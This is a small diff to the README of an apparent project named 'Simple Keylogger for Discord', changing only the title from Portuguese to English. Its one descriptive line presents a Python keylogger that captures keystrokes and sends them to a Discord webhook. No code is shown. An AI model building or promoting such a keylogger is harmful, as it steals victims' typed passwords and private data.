@@ -1,4 +1,4 @@
-# Keylogger Simples para Discord
+# Simple Keylogger for Discord
 
 Simple Python keylogger to capture keystrokes and send them to a Discord webhook.
 
